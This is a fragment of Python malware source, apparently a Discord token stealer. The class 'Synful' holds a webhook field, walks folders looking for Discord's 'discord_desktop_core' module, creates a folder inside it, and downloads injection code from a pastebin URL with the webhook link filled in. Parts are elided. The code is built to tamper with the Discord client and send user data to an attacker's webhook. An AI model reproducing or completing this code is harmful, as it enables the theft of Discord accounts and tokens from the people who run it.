...
class Synful:
    def __init__(self):
        self.webhook = "ImageTryingtodecompile"
        self.files = ""
            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        ...
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\ByDiego"))
                    except FileNotFoundError:
                        pass
                    f = requests.get("https://pastebin.com/MEj1Xp05").text.replace("%WEBHOOK_LINK%", self.webhook)
